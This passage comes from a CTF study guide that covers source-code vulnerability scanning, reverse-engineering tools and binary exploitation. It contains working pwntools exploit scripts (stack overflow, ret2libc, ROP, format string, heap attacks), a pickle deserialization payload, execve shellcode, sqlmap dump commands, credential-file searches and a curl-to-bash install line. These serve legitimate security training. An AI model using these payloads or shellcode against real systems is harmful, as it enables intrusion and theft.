    try:
        results['base64'] = base64.b64decode(data).decode()
    except:
        pass
    
    # Hex
    try:
        results['hex'] = bytes.fromhex(data).decode()
    except:
        pass
    
    # URL encoding
    try:
        results['url'] = unquote(data)
    except:
        pass
    
    # ROT13
    try:
        results['rot13'] = data.encode().decode('rot13')
    except:
        pass
    
    # Base32
    try:
        results['base32'] = base64.b32decode(data).decode()
    except:
        pass
    
    return results

data = "RkxBR3t0ZXN0fQ=="
results = try_decodings(data)
for encoding, value in results.items():
    print(f"[{encoding}] {value}")
```

**CyberChef for complex decoding:**

```
# Use CyberChef web interface or CLI
# Common recipe: From Base64 -> From Hex -> ROT13
# Available at: https://gchq.github.io/CyberChef/
```

### Flag Validation

**Testing flag format:**

```bash
# Submit via curl
curl -X POST https://target.com/submit \
  -d "flag=flag{test_flag_123}"

# Check response for success indicators
curl -X POST https://target.com/submit \
  -d "flag=flag{test}" | grep -i "correct\|success\|congratulations"
```

**Common submission endpoints:**

```
/submit
/flag
/check
/verify
/api/submit
/api/flag
```

---

## Source Code Analysis

### Static Code Analysis Tools

**Grep-based vulnerability patterns:**

```bash
# SQL injection patterns
grep -rn "SELECT.*\$_GET\|SELECT.*\$_POST" .
grep -rn "mysql_query.*\$" .
grep -rn "execute.*\$" .

# Command injection patterns
grep -rn "system\|exec\|shell_exec\|passthru\|popen" .
grep -rn "eval\(" .

# File inclusion patterns
grep -rn "include.*\$\|require.*\$" .
grep -rn "file_get_contents.*\$" .

# XSS patterns
grep -rn "echo.*\$_GET\|echo.*\$_POST" .
grep -rn "print.*\$_" .
```

**Comprehensive vulnerability scanner script:**

```python
#!/usr/bin/env python3
import os
import re

patterns = {
    'SQL Injection': [
        r'mysql_query\s*\([^)]*\$',
        r'mysqli_query\s*\([^)]*\$',
        r'SELECT.*\$_(GET|POST|REQUEST)',
        r'execute\s*\([^)]*\$',
    ],
    'Command Injection': [
        r'system\s*\([^)]*\$',
        r'exec\s*\([^)]*\$',
        r'shell_exec\s*\([^)]*\$',
        r'passthru\s*\([^)]*\$',
        r'`[^`]*\$',
    ],
    'File Inclusion': [
        r'include\s*\([^)]*\$',
        r'require\s*\([^)]*\$',
        r'include_once\s*\([^)]*\$',
        r'require_once\s*\([^)]*\$',
    ],
    'XSS': [
        r'echo\s+\$_(GET|POST|REQUEST)',
        r'print\s+\$_(GET|POST|REQUEST)',
        r'<\?=\s*\$_(GET|POST)',
    ],
    'Deserialization': [
        r'unserialize\s*\(',
        r'pickle\.loads',
        r'yaml\.load\s*\(',
    ],
}

def scan_file(filepath):
    try:
        with open(filepath, 'r', errors='ignore') as f:
            content = f.read()
            lines = content.split('\n')
            
            for vuln_type, patterns_list in patterns.items():
                for pattern in patterns_list:
                    for i, line in enumerate(lines, 1):
                        if re.search(pattern, line, re.IGNORECASE):
                            print(f"[{vuln_type}] {filepath}:{i}")
                            print(f"  {line.strip()}\n")
    except:
        pass

def scan_directory(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(('.php', '.py', '.js', '.jsp', '.asp')):
                filepath = os.path.join(root, file)
                scan_file(filepath)

if __name__ == "__main__":
    import sys
    scan_directory(sys.argv[1] if len(sys.argv) > 1 else '.')
```

**Usage:**

```bash
python3 vuln_scanner.py /path/to/source
```

### PHP Source Code Analysis

**Dangerous functions to search for:**

```bash
# Code execution
grep -rn "eval\|assert\|preg_replace.*\/e" .

# File operations
grep -rn "file_get_contents\|file_put_contents\|fopen\|readfile" .

# Serialization
grep -rn "unserialize\|serialize" .

# Information disclosure
grep -rn "phpinfo\|var_dump\|print_r" .

# Weak comparison
grep -rn "==\|!=" . | grep -v "==="
```

**Type juggling vulnerabilities:**

```php
// Look for loose comparisons
if ($password == $stored_hash)  // Vulnerable to type juggling

// Magic hash exploitation
// Search for: == with hashes starting with 0e
```

**Example exploitation script:**

```python
# Find magic hashes for type juggling
import hashlib

target = "0e123456789"  # Any hash starting with 0e

counter = 0
while True:
    test = str(counter)
    hash_md5 = hashlib.md5(test.encode()).hexdigest()
    
    if hash_md5[:2] == "0e" and hash_md5[2:].isdigit():
        print(f"[+] Found: {test} -> {hash_md5}")
        break
    
    counter += 1
    if counter % 100000 == 0:
        print(f"[*] Tried {counter}...")
```

**[Inference] Known magic hashes:**

```
MD5:
240610768 -> 0e462097431906509019562988736854
QNKCDZO -> 0e830400451993494058024219903391

SHA1:
10932435112 -> 0e07766915004133176347055865026311692244
```

### Python Source Code Analysis

**Dangerous patterns:**

```bash
# Code execution
grep -rn "eval\|exec\|compile\|__import__" .

# Command injection
grep -rn "os.system\|subprocess.call\|os.popen" .

# Deserialization
grep -rn "pickle.loads\|yaml.load\|marshal.loads" .

# SQL injection
grep -rn "execute.*%\|execute.*format\|execute.*\+" .
```

**Pickle deserialization exploitation:**

```python
# Search for pickle.loads() usage
grep -rn "pickle.loads" .

# Exploitation payload generation
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))

payload = pickle.dumps(Exploit())
print(payload.hex())
```

### JavaScript Source Code Analysis

**Client-side vulnerabilities:**

```bash
# Sensitive data in JS
grep -rn "password\|secret\|api_key\|token" *.js

# Dangerous functions
grep -rn "eval\|Function\|setTimeout\|setInterval" *.js

# DOM manipulation
grep -rn "innerHTML\|outerHTML\|document.write" *.js

# AJAX endpoints
grep -rn "fetch\|XMLHttpRequest\|\$.ajax\|\$.get\|\$.post" *.js
```

**Extract API endpoints:**

```bash
# Find all URLs in JavaScript
grep -roh "https\?://[^\"']*" *.js | sort -u

# Find relative endpoints
grep -roh "[\"\']\/[a-zA-Z0-9/_-]*[\"\']" *.js | sort -u
```

**Deobfuscation tools:**

```bash
# Using js-beautify
js-beautify obfuscated.js > readable.js

# Using prettier
prettier --write obfuscated.js

# Online tools: jsnice.org, beautifier.io
```

**Manual deobfuscation approach:**

```javascript
// Replace obfuscated variables with readable names
// Original:
var _0x1234 = "flag";

// After deobfuscation:
var flag_value = "flag";

// Use browser console to execute and inspect
console.log(_0x1234);
```

### Java Source Code Analysis

**JAR file analysis:**

```bash
# Extract JAR
unzip application.jar -d extracted/

# Decompile class files (see Decompilation section)
jadx application.jar -d source/

# Search for vulnerabilities
grep -rn "Runtime.getRuntime\|ProcessBuilder" extracted/
grep -rn "readObject\|XMLDecoder" extracted/
```

### Configuration File Analysis

**Common sensitive files:**

```bash
# Database credentials
cat config.php | grep -i "db_\|database\|mysql"
cat application.properties | grep -i "datasource\|jdbc"

# API keys
grep -rn "api_key\|apikey\|secret\|token" .

# AWS credentials
cat .env | grep -i "aws_\|s3_"

# SSH keys
find . -name "*.pem" -o -name "id_rsa*"
```

**Environment variable extraction:**

```bash
# .env files
cat .env

# Docker compose
cat docker-compose.yml | grep -A 5 "environment:"

# Kubernetes secrets
kubectl get secrets -o yaml
```

### Git Repository Analysis

**Extract sensitive data from Git history:**

```bash
# Clone repository
git clone https://target.com/repo.git

# Search commit history for flags
git log --all --pretty=format:"%H %s" | while read commit msg; do
    git show $commit | grep -iE "flag|password|secret"
done

# Search for removed files
git log --all --full-history --diff-filter=D -- "*flag*"

# Check all branches
git branch -a
git checkout branch_name
```

**Git forensics tools:**

```bash
# GitTools for Git extraction
./gitdumper.sh https://target.com/.git/ output/

# TruffleHog for secret scanning
trufflehog git https://target.com/repo.git

# GitLeaks
gitleaks detect --source /path/to/repo
```

**Recover deleted commits:**

```bash
# Show reflog
git reflog

# Recover specific commit
git checkout <commit-hash>
```

### SQL Schema Analysis

**Common flag storage locations:**

```sql
-- Search for flag-related tables
SELECT table_name FROM information_schema.tables 
WHERE table_name LIKE '%flag%';

-- Search for flag columns
SELECT table_name, column_name 
FROM information_schema.columns 
WHERE column_name LIKE '%flag%';

-- Dump all table structures
SELECT table_name, column_name, data_type 
FROM information_schema.columns;
```

**Automated database analysis:**

```bash
# Using sqlmap
sqlmap -u "https://target.com?id=1" --tables
sqlmap -u "https://target.com?id=1" -D database_name --dump

# MySQL command line
mysql -u user -p -e "SHOW DATABASES;"
mysql -u user -p database_name -e "SHOW TABLES;"
```

---

## Decompilation and Reverse Engineering

### Binary Analysis Workflow

**Initial reconnaissance:**

```bash
# File type identification
file binary_file

# Check for strings
strings binary_file | less
strings -e l binary_file  # Little-endian 16-bit (Unicode)
strings -e b binary_file  # Big-endian 16-bit

# Executable information
readelf -h binary_file  # ELF header (Linux)
objdump -f binary_file  # File header
rabin2 -I binary_file   # Using radare2
```

**Check for protections:**

```bash
# Security features
checksec binary_file

# Output shows:
# - RELRO (Relocation Read-Only)
# - Stack Canary
# - NX (No Execute)
# - PIE (Position Independent Executable)
# - RPATH/RUNPATH

# Using pwntools
pwn checksec binary_file
```

### Linux Binary Decompilation

**Using Ghidra:**

```bash
# Launch Ghidra
ghidraRun

# Command line analysis
analyzeHeadless /path/to/project ProjectName \
  -import binary_file \
  -postScript DecompileAll.java

# Key features:
# - Decompiler shows C-like pseudocode
# - Function list in Symbol Tree
# - Search for strings containing "flag"
# - Cross-references (Ctrl+Shift+F)
```

**Ghidra analysis workflow:**

1. Import binary (File → Import File)
2. Analyze with default options (Analysis → Auto Analyze)
3. Find main() function (Symbol Tree → Functions)
4. Review decompiled code in Decompiler window
5. Search for interesting strings (Search → For Strings)
6. Follow cross-references to flag access

**Using IDA Free/Pro:**

```bash
# Open binary in IDA
ida64 binary_file  # 64-bit binary
ida binary_file    # 32-bit binary

# Key shortcuts:
# F5 - Decompile function (IDA Pro only)
# X - Cross-references
# N - Rename variable
# Y - Change function prototype
# Shift+F12 - Strings window
```

**Using Binary Ninja:**

```bash
# Launch Binary Ninja
binaryninja binary_file

# Features:
# - Low/Medium/High Level IL (Intermediate Language)
# - HLIL is most readable (similar to C)
# - Built-in decompiler
# - Python API for automation
```

**Command-line disassembly:**

```bash
# Using objdump
objdump -d binary_file > disassembly.txt
objdump -M intel -d binary_file  # Intel syntax

# Using radare2
r2 binary_file
aaa  # Analyze all
pdf @main  # Print disassembly of main
V  # Visual mode
VV  # Visual graph mode
```

**Radare2 workflow:**

```bash
r2 -A binary_file  # Open and analyze

# Common commands:
afl  # List all functions
pdf @sym.main  # Disassemble main
/ flag  # Search for "flag" string
iz  # List strings in data section
s sym.check_flag  # Seek to function
pdf  # Print disassembly
VV  # Visual graph mode
```

### Windows Binary Decompilation

**Using dnSpy (.NET binaries):**

```bash
# Launch dnSpy
dnSpy.exe application.exe

# Features:
# - Full .NET decompilation to C#
# - Edit and recompile
# - Debug .NET applications
# - Search for "flag" in decompiled code
```

**Using ILSpy (.NET):**

```bash
# Command line
ilspycmd application.exe -o output_dir/

# GUI version shows:
# - Decompiled C# code
# - Assembly structure
# - Resource files
```

**Using PE Explorer:**

```bash
# Analyze PE structure
pe-explorer.exe application.exe

# Check:
# - Import/Export tables
# - Resources (strings, images)
# - Version information
```

**Unpacking packed executables:**

```bash
# Detect packer
exeinfope binary.exe
# or
die binary.exe  # Detect It Easy

# Common packers: UPX, ASPack, Themida

# Unpack UPX
upx -d packed.exe -o unpacked.exe

# For other packers, may need specialized tools or dynamic analysis
```

### Java Decompilation

**Using JADX:**

```bash
# GUI mode
jadx-gui application.jar

# Command line
jadx application.jar -d output_dir/

# Features:
# - Decompiles DEX and APK files
# - Good for Android apps
# - Search functionality
# - Export to Gradle project
```

**Using JD-GUI:**

```bash
# Launch GUI
jd-gui application.jar

# Right-click → Save All Sources
# Search for "flag" in decompiled code
```

**Using Fernflower (IntelliJ decompiler):**

```bash
java -jar fernflower.jar application.jar output_dir/
```

**Using Procyon:**

```bash
# Decompile single class
procyon-decompiler -jar application.jar \
  -o output_dir/

# Often produces cleaner output than other tools
```

**Class file decompilation:**

```bash
# Decompile .class file
jadx ClassName.class

# Using javap (disassembler, not decompiler)
javap -c ClassName.class  # Bytecode
javap -p -c ClassName.class  # Include private members
```

### Android APK Analysis

**APK extraction and decompilation:**

```bash
# Extract APK (it's a ZIP file)
unzip application.apk -d extracted/

# Decompile using apktool
apktool d application.apk -o decompiled/

# Result includes:
# - AndroidManifest.xml (readable)
# - Smali code (Android bytecode)
# - Resources

# Decompile to Java
jadx application.apk -d java_source/
```

**Analyzing smali code:**

```bash
# Smali is Android Dalvik bytecode
# Key instructions:
# invoke-* - Method calls
# const-string - String constants
# iget/iput - Field access

# Search for flag strings
grep -r "flag" decompiled/smali/
```

**Dynamic analysis:**

```bash
# Install APK on emulator/device
adb install application.apk

# Run application
adb shell am start -n com.example.app/.MainActivity

# Monitor logs
adb logcat | grep -i flag

# Pull files from device
adb pull /data/data/com.example.app/
```

**Frida for runtime manipulation:**

```bash
# List processes
frida-ps -U

# Attach to app
frida -U -n com.example.app

# Hook function
Java.perform(function() {
    var MainActivity = Java.use('com.example.app.MainActivity');
    MainActivity.checkFlag.implementation = function(input) {
        console.log('[+] checkFlag called with: ' + input);
        var result = this.checkFlag(input);
        console.log('[+] checkFlag returned: ' + result);
        return result;
    };
});
```

### Python Bytecode Decompilation

**Decompile .pyc files:**

```bash
# Using uncompyle6
uncompyle6 script.pyc > script.py

# Using decompyle3 (Python 3.7+)
decompyle3 script.pyc > script.py

# Using pycdc
pycdc script.pyc > script.py
```

**Extract .pyc from executable:**

```bash
# If Python script is frozen with PyInstaller
python pyinstxtractor.py executable.exe

# Results in extracted .pyc files
# Then decompile as above
```

**Python obfuscation bypass:**

```python
# If code uses marshal
import marshal
with open('compiled.pyc', 'rb') as f:
    f.read(16)  # Skip header
    code = marshal.load(f)
    print(code.co_consts)  # View constants
```

### Dynamic Analysis

**Using GDB:**

```bash
# Load binary
gdb ./binary_file

# Set breakpoints
break main
break *0x400123  # Address breakpoint

# Run
run

# Execution control
step  # Step into
next  # Step over
continue

# Examine memory
x/10x $rsp  # 10 hex words at stack pointer
x/s 0x400000  # String at address

# Examine registers
info registers
print $rax

# Search for strings in memory
find &start_address, +length, "flag"
```

**Using ltrace/strace:**

```bash
# Trace library calls
ltrace ./binary_file

# Trace system calls
strace ./binary_file

# Save output
ltrace -o trace.txt ./binary_file

# Look for flag in output
ltrace ./binary_file 2>&1 | grep -i flag
```

**Using Frida (general purpose):**

```bash
# List processes
frida-ps

# Attach to process
frida binary_file

# JavaScript hook example
Interceptor.attach(Module.findExportByName(null, 'strcmp'), {
    onEnter: function(args) {
        console.log('[strcmp] arg1: ' + Memory.readUtf8String(args[0]));
        console.log('[strcmp] arg2: ' + Memory.readUtf8String(args[1]));
    },
    onLeave: function(retval) {
        console.log('[strcmp] returned: ' + retval);
    }
});
```

**Using angr (symbolic execution):**

```python
#!/usr/bin/env python3
import angr

# Load binary
project = angr.Project('./binary_file', auto_load_libs=False)

# Create initial state
state = project.factory.entry_state()

# Create simulation manager
simgr = project.factory.simulation_manager(state)

# Find path to success, avoid failure
simgr.explore(find=0x400800, avoid=0x400850)

# If found, print solution
if simgr.found:
    solution_state = simgr.found[0]
    print(solution_state.posix.dumps(0))  # stdin input
```

### Assembly Reading Essentials

**x86-64 function prologue/epilogue:**

```nasm
; Function start
push rbp
mov rbp, rsp
sub rsp, 0x20  ; Allocate stack space

; Function end
leave  ; mov rsp, rbp; pop rbp
ret
```

**Common instructions:**

```nasm
mov dst, src    ; Move data
lea dst, [src]  ; Load effective address
push src        ; Push to stack
pop dst         ; Pop from stack
call func       ; Call function
ret             ; Return

add dst, src    ; Addition
sub dst, src    ; Subtraction
xor dst, src    ; XOR (xor rax, rax = zero rax)

cmp a, b        ; Compare (sets flags)
je/jne target   ; Jump if equal/not equal
jg/jl target    ; Jump if greater/less
jmp target      ; Unconditional jump

test a, b       ; Bitwise AND (sets flags, doesn't store)
```

**x86-64 calling convention (System V):**

```
Arguments: rdi, rsi, rdx, rcx, r8, r9, then stack
Return value: rax
```

**String comparison pattern:**

```nasm
; Looking for password check
mov rdi, user_input
mov rsi, correct_password
call strcmp
test eax, eax  ; Check if equal
jne fail_label  ; Jump if not equal
```

### Common CTF Reverse Engineering Patterns

**Anti-debugging checks:**

```c
// Look for ptrace calls
if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
    exit(1);  // Being debugged
}

// Timing checks
clock_t start = clock();
// ... some code ...
if (clock() - start > threshold) {
    exit(1);  // Debugger detected
}
```

**Bypass anti-debugging:**

```bash
# Patch binary to skip check
# Using radare2:
r2 -w binary_file
s 0x400500  # Seek to anti-debug check
wa nop  # Write NOP instruction
wa nop
```

**XOR encoding pattern:**

```c
// Common obfuscation
char flag[] = {0x12, 0x34, 0x56, ...};
for (int i = 0; i < sizeof(flag); i++) {
    flag[i] ^= 0xAA;
}
// flag now contains readable string
```

**Extracting XOR key:**

```python
# If you know part of the plaintext
ciphertext = bytes.fromhex("12345678...")
known_plain = b"flag{"

key = bytes([c ^ p for c, p in zip(ciphertext, known_plain)])
print(f"Key: {key}")
```

**Base64 + XOR pattern:**

```python
import base64

encoded = "base64_string_here"
decoded = base64.b64decode(encoded)

# Try XOR with common keys
for key in range(256):
    result = bytes([b ^ key for b in decoded])
    if b'flag' in result:
        print(f"Key: {key}, Result: {result}")
```

### Firmware Analysis

**Binwalk for embedded binaries:**

```bash
# Analyze firmware
binwalk firmware.bin

# Extract filesystem
binwalk -e firmware.bin

# Look for embedded files
binwalk --dd='.*' firmware.bin
```

**Strings analysis:**

```bash
# Extract ASCII strings
strings firmware.bin | grep -i "flag\|password\|key"

# Extract Unicode strings
strings -e l firmware.bin

# Minimum string length
strings -n 10 firmware.bin
```

---

**Related Subtopics**

For comprehensive CTF preparation, also study:

- **Memory Corruption Exploits** - Buffer overflows, format strings, heap exploitation
- **Cryptanalysis Techniques** - Breaking weak crypto implementations common in CTFs
- **Network Protocol Analysis** - PCAP analysis, packet crafting, protocol exploitation
- **Binary Exploitation Tools** - pwntools, ROPgadget, ropper for exploit development

---

## Binary Exploitation Basics

### Reconnaissance and Initial Analysis

**File Identification**

```bash
# Determine file type
file binary_challenge

# Check architecture and protection mechanisms
checksec binary_challenge

# Alternative checksec
rabin2 -I binary_challenge

# Strings extraction
strings binary_challenge
strings -e l binary_challenge  # 16-bit little-endian
strings -e b binary_challenge  # 16-bit big-endian

# Hexdump analysis
hexdump -C binary_challenge | less
xxd binary_challenge | less
```

**Dynamic Analysis Setup**

```bash
# Run with input control
./binary_challenge < input.txt
echo "AAAA" | ./binary_challenge

# Strace for system calls
strace ./binary_challenge
strace -e trace=read,write,open ./binary_challenge

# Ltrace for library calls
ltrace ./binary_challenge
ltrace -i ./binary_challenge  # Show instruction pointer
```

### Buffer Overflow Exploitation

**Stack Buffer Overflow Detection**

```bash
# Generate cyclic pattern
gdb-peda$ pattern_create 200
gdb-peda$ pattern_create 200 input.txt

# Alternative with pwntools
python3 -c "from pwn import *; print(cyclic(200))" > input.txt

# Run program with pattern
gdb ./binary_challenge
gdb> run < input.txt

# Find offset from crash
gdb-peda$ pattern_offset 0x41614141
# Or from register
gdb-peda$ pattern_offset $eip
```

**Basic Stack Overflow Exploitation**

```python
#!/usr/bin/env python3
from pwn import *

# Context setup
context.arch = 'i386'  # or 'amd64'
context.os = 'linux'

# Load binary
elf = ELF('./vuln_binary')
p = process('./vuln_binary')
# Or remote connection
# p = remote('ctf.challenge.com', 1337)

# Calculate offset to return address
offset = 112

# Build payload
payload = b'A' * offset
payload += p32(0xdeadbeef)  # Return address (32-bit)
# For 64-bit: p64(0xdeadbeef)

# Send payload
p.sendline(payload)
p.interactive()
```

**Return to Win Function**

```python
from pwn import *

elf = ELF('./binary')
p = process('./binary')

# Find win function address
win_addr = elf.symbols['win']
# Or manually: win_addr = 0x08048456

offset = 64
payload = b'A' * offset + p32(win_addr)

p.sendline(payload)
p.interactive()
```

**Return to Libc (ret2libc)**

```python
from pwn import *

elf = ELF('./vuln')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
p = process('./vuln')

# Find addresses
system_plt = elf.plt['system']
exit_plt = elf.plt['exit']
binsh = next(libc.search(b'/bin/sh'))

# Build payload (32-bit)
offset = 112
payload = b'A' * offset
payload += p32(system_plt)
payload += p32(exit_plt)      # Return address for system
payload += p32(binsh)         # Argument to system

p.sendline(payload)
p.interactive()
```

**ROP (Return-Oriented Programming) Basics**

```python
from pwn import *

elf = ELF('./binary')
rop = ROP(elf)

# Find gadgets manually
# ROPgadget --binary binary | grep "pop rdi"

# Build ROP chain (64-bit)
pop_rdi = 0x400743  # pop rdi; ret
bin_sh = 0x601060
system_addr = 0x400560

offset = 120
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system_addr)

# Or use pwntools ROP automation
rop.call('system', [bin_sh])
payload = b'A' * offset + rop.chain()
```

**Using ROPgadget**

```bash
# Find all gadgets
ROPgadget --binary binary_challenge

# Search specific gadgets
ROPgadget --binary binary_challenge | grep "pop rdi"
ROPgadget --binary binary_challenge | grep "pop rsi"

# Generate automatic ROP chain
ROPgadget --binary binary --ropchain

# Find gadgets in specific sections
ROPgadget --binary binary --range 0x400000-0x401000
```

### Format String Vulnerabilities

**Detection and Information Leak**

```bash
# Test for format string vulnerability
echo "AAAA.%x.%x.%x.%x" | ./vuln

# Leak stack values
echo "%p.%p.%p.%p.%p.%p.%p.%p" | ./vuln

# Find position of input on stack
echo "AAAA.%1\$x.%2\$x.%3\$x.%4\$x.%5\$x" | ./vuln
```

**Reading Arbitrary Memory**

```python
from pwn import *

p = process('./vuln')

# Read from specific address (e.g., GOT entry)
target_addr = 0x0804a018

# Using direct parameter access
# %s reads string from address
# %7$s means read string from 7th parameter
payload = p32(target_addr) + b'.%7$s'

p.sendline(payload)
data = p.recvline()
print(hexdump(data))
```

**Writing Arbitrary Memory**

```python
from pwn import *

p = process('./vuln')

# Write to address using %n (writes number of bytes printed)
target_addr = 0x0804a020
write_value = 0x08048456

# Calculate padding needed
# %n writes the number of characters printed so far
padding = write_value - 4  # Subtract address length

payload = p32(target_addr)
payload += f'%{padding}x'.encode()
payload += b'%7$n'  # Write to 7th parameter

p.sendline(payload)
```

**Automated Format String Exploitation**

```python
from pwn import *

context.log_level = 'debug'
elf = ELF('./vuln')
p = process('./vuln')

# Using pwntools FmtStr
# First, find offset
autofmt = FmtStr(execute_fmt=lambda x: p.sendline(x) or p.recvline())
offset = autofmt.offset

# Write to GOT entry
writes = {elf.got['exit']: elf.symbols['win']}
payload = fmtstr_payload(offset, writes)

p.sendline(payload)
p.interactive()
```

### Heap Exploitation Basics

**Heap Overflow - Fastbin Corruption**

[Inference] Heap exploitation often requires understanding the specific allocator (ptmalloc, jemalloc, etc.).

```python
from pwn import *

p = process('./heap_vuln')

# Typical fastbin attack pattern
# 1. Allocate chunks
# 2. Free to populate fastbin
# 3. Overflow to overwrite fd pointer
# 4. Allocate to arbitrary location

# Allocate two chunks
p.sendline(b'1')  # malloc(0x60)
p.sendline(b'1')  # malloc(0x60)

# Free first chunk
p.sendline(b'2')  # free chunk 0

# Overflow second chunk to overwrite first chunk's fd
target_addr = 0x601060
payload = b'A' * 0x60 + p64(0x71) + p64(target_addr)
p.sendline(b'3')  # edit chunk 1
p.sendline(payload)

# Allocate twice to get chunk at target_addr
p.sendline(b'1')  # Gets original freed chunk
p.sendline(b'1')  # Gets chunk at target_addr
```

**Use-After-Free (UAF)**

```python
from pwn import *

p = process('./uaf_challenge')

# Typical UAF exploitation flow
# 1. Allocate object
# 2. Free object
# 3. Allocate same-sized object to overlap
# 4. Use original pointer to access new object

# Allocate user object
p.sendline(b'1')  # create_user()
p.sendline(b'admin')

# Free user (but pointer remains)
p.sendline(b'2')  # delete_user()

# Allocate attacker-controlled data in same location
p.sendline(b'3')  # create_note()
fake_vtable = p64(0x400890)  # Function pointer
p.sendline(fake_vtable)

# Trigger use of freed pointer
p.sendline(b'4')  # call_user_function()

p.interactive()
```

**Heap Feng Shui**

[Inference] Heap feng shui involves carefully controlling heap layout through allocation patterns.

```python
# Technique to position heap chunks precisely
# Spray heap with allocations
for i in range(10):
    allocate(0x80, b'A' * 0x80)

# Create holes with specific pattern
free(2)
free(4)
free(6)

# Allocate target object in controlled location
allocate(0x80, payload)
```

### Shellcode Development

**Basic x86 Shellcode**

```nasm
; execve("/bin/sh", NULL, NULL) - 32-bit
xor eax, eax
push eax
push 0x68732f2f  ; "//sh"
push 0x6e69622f  ; "/bin"
mov ebx, esp
xor ecx, ecx
xor edx, edx
mov al, 0xb      ; execve syscall number
int 0x80
```

Assembled shellcode:

```python
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
```

**x64 Shellcode**

```nasm
; execve("/bin/sh", NULL, NULL) - 64-bit
xor rsi, rsi
push rsi
mov rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop rdi
xor rdx, rdx
mov al, 59      ; execve syscall number
syscall
```

**Using Pwntools for Shellcode**

```python
from pwn import *

# Generate shellcode automatically
context.arch = 'i386'  # or 'amd64'
context.os = 'linux'

shellcode = asm(shellcraft.sh())
# Or specific syscall
shellcode = asm(shellcraft.execve('/bin/sh', 0, 0))

# For 64-bit
context.arch = 'amd64'
shellcode = asm(shellcraft.amd64.linux.sh())
```

**Alphanumeric Shellcode**

[Unverified] Some encoders claim to generate shellcode using only alphanumeric characters:

```bash
# Using msfvenom
msfvenom -p linux/x86/exec CMD=/bin/sh -e x86/alpha_mixed -f python

# Manual encoding (complex, typically use tools)
```

**Bad Character Avoidance**

```python
from pwn import *

# Test for bad characters
bad_chars = b'\x00\x0a\x0d'

# Generate shellcode avoiding bad chars
context.arch = 'i386'
shellcode = asm(shellcraft.sh())

# Check for bad characters
if any(byte in shellcode for byte in bad_chars):
    # Use encoder
    from pwnlib.encoders import encode
    encoded = encode(shellcode, avoid=bad_chars)
```

### Integer Overflow/Underflow

**Detection Pattern**

```c
// Vulnerable code example
void allocate(unsigned int size) {
    if(size > 1024) {
        printf("Too large\n");
        return;
    }
    char *buf = malloc(size + 10);  // Integer overflow here
    read(0, buf, size);
}
```

**Exploitation**

```python
from pwn import *

p = process('./int_overflow')

# Trigger integer overflow
# size = 0xFFFFFFFF (4294967295)
# size + 10 = 9 (wraps around)
# Allocates 9 bytes but reads 4294967295 bytes

size = 0xFFFFFFFF - 10 + 1  # Will overflow to small number
p.sendline(str(size).encode())

# Send overflow payload
payload = b'A' * 200 + p32(0xdeadbeef)
p.send(payload)

p.interactive()
```

### Binary Analysis Tools

**GDB with Enhancements**

```bash
# Install peda
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

# Install gef (alternative)
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

# Install pwndbg (alternative)
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# Common GDB commands
gdb ./binary
gdb> break main
gdb> run < input.txt
gdb> disassemble main
gdb> x/20x $esp        # Examine stack
gdb> x/20i $eip        # Examine instructions
gdb> info registers
gdb> vmmap             # Memory mapping (peda/gef)
gdb> checksec          # Security features
```

**Radare2**

```bash
# Open binary
r2 -d ./binary

# Analysis
[0x00400000]> aaa      # Analyze all
[0x00400000]> afl      # List functions
[0x00400000]> pdf @main  # Disassemble main

# Visual mode
[0x00400000]> V        # Enter visual
[0x00400000]> VV       # Visual graph mode

# Search
[0x00400000]> / /bin/sh  # Search string
[0x00400000]> /R pop rdi  # Search ROP gadgets

# Debug mode
[0x00400000]> db 0x400456  # Set breakpoint
[0x00400000]> dc           # Continue
[0x00400000]> dr           # Show registers
```

**Ghidra**

```bash
# Launch Ghidra
ghidra

# Command-line headless analysis
analyzeHeadless /path/to/project ProjectName -import binary_file -postScript DecompileScript.java
```

Ghidra workflow:

1. Import binary (File → Import File)
2. Analyze (Analysis → Auto Analyze)
3. Review decompiled code in Decompiler window
4. Rename functions/variables for clarity
5. Export analysis if needed

**Binary Ninja**

```python
# Python API scripting
import binaryninja as bn

bv = bn.open_view("/path/to/binary")

# Find function
main = bv.get_function_at(bv.entry_point)

# Get cross-references
xrefs = bv.get_code_refs(target_addr)

# Find strings
for string in bv.strings:
    if b"flag" in string.value:
        print(f"Found at: {hex(string.start)}")
```

**angr - Symbolic Execution**

```python
import angr
import claripy

# Load binary
proj = angr.Project('./binary', auto_load_libs=False)

# Create symbolic input
flag = claripy.BVS('flag', 8 * 32)  # 32 bytes

# Create initial state
state = proj.factory.entry_state(stdin=flag)

# Add constraints (if known)
for byte in flag.chop(8):
    state.solver.add(byte >= 0x20)  # Printable
    state.solver.add(byte <= 0x7e)

# Create simulation manager
simgr = proj.factory.simulation_manager(state)

# Find state that reaches win condition
simgr.explore(find=0x400687, avoid=0x40068e)

if simgr.found:
    solution = simgr.found[0]
    print(solution.posix.dumps(0))  # Print stdin that reaches win
```

## Memory Analysis

### Memory Dump Acquisition

**Creating Memory Dumps**

```bash
# From running process (Linux)
gcore <pid>

# Dump process memory regions
cat /proc/<pid>/maps
dd if=/proc/<pid>/mem of=process_dump.bin bs=1 skip=<start_addr> count=<size>

# Full system memory dump
dd if=/dev/mem of=memory_dump.raw bs=1M
# Or using specialized tools
sudo insmod lime.ko "path=/tmp/memory.lime format=lime"
```

**Windows Memory Acquisition**

[Inference] These tools are commonly used in CTF challenges involving Windows memory dumps:

```bash
# Using DumpIt (Windows)
DumpIt.exe /OUTPUT memory.dmp

# Using winpmem
winpmem_mini_x64.exe memory.raw
```

### Volatility Framework

**Volatility 2 Basic Commands**

```bash
# Identify image profile
volatility -f memory.dump imageinfo

# Set profile for subsequent commands
export VOLATILITY_PROFILE=Win7SP1x64
export VOLATILITY_LOCATION=file:///path/to/memory.dump

# Process listing
volatility -f memory.dump --profile=Win7SP1x64 pslist
volatility -f memory.dump --profile=Win7SP1x64 pstree
volatility -f memory.dump --profile=Win7SP1x64 psscan  # Find hidden processes

# Network connections
